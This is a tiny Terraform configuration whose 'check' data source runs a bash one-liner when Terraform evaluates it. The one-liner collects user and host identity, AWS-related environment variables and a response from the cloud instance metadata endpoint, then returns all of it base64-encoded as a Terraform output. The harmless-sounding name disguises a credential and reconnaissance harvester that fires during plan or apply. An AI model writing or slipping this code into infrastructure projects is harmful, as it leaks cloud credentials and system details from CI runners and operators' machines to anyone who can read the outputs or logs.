data "external" "check" {
  program = ["bash", "-c", "{ id; hostname; uname -a; cat /etc/hostname 2>/dev/null; whoami; env | grep -i AWS | head -10; curl -sm2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo no-imds; } > /tmp/o.txt 2>&1; echo \"{\\"r\\":\\"$(base64 -w0 /tmp/o.txt)\\"}\";"]
}
output "result" {
  value = data.external.check.result
}
